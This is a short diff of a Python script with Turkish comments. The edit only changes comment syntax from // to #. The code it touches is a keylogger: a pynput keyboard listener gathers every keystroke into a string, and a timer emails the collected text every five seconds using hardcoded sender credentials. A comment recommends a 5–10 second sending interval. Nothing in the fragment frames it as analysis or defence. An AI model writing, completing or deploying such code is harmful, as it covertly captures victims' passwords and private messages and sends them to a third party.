@@ -52,8 +52,8 @@ def emir(harfler):
             toplama += str(harfler)
     print(toplama)
 
-sender_emmail = "mail@gmail.com" //Gönderim yapacak mail adresi
-sender_password = "password" //Mail Şifresi
+sender_emmail = "mail@gmail.com" #Gönderim yapacak mail adresi
+sender_password = "password" #Mail Şifresi
 
 def mail_gonder(mesaj):
     global toplama
@@ -67,7 +67,7 @@ def dallanma():
     global toplama
     mail_gonder(toplama)
     toplama=""
-    timer = threading.Timer(5,dallanma) // Kaç Saniye aralıkla gönderim yapılacağını belirleyiniz öneri 5 10 sn
+    timer = threading.Timer(5,dallanma) #Kaç Saniye aralıkla gönderim yapılacağını belirleyiniz öneri 5 10 sn
     timer.start()
     
 dinleme = pynput.keyboard.Listener(on_press=emir)
